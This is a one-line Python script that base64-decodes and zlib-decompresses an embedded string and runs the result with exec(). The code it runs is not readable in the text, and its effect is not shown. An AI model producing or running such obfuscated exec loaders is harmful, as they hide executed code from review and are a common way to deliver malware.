import zlib,base64;exec(zlib.decompress(base64.b64decode('eNrLzC3ILypRyC/mSivKz1XIyy9OVciEiBWV5nEBsUZKalpiaU5JSGpxiW1+sV5BYkmGXkpmUV5ibqpGfHxaZk5qfLymJgD2shsL')).decode('utf-8'))
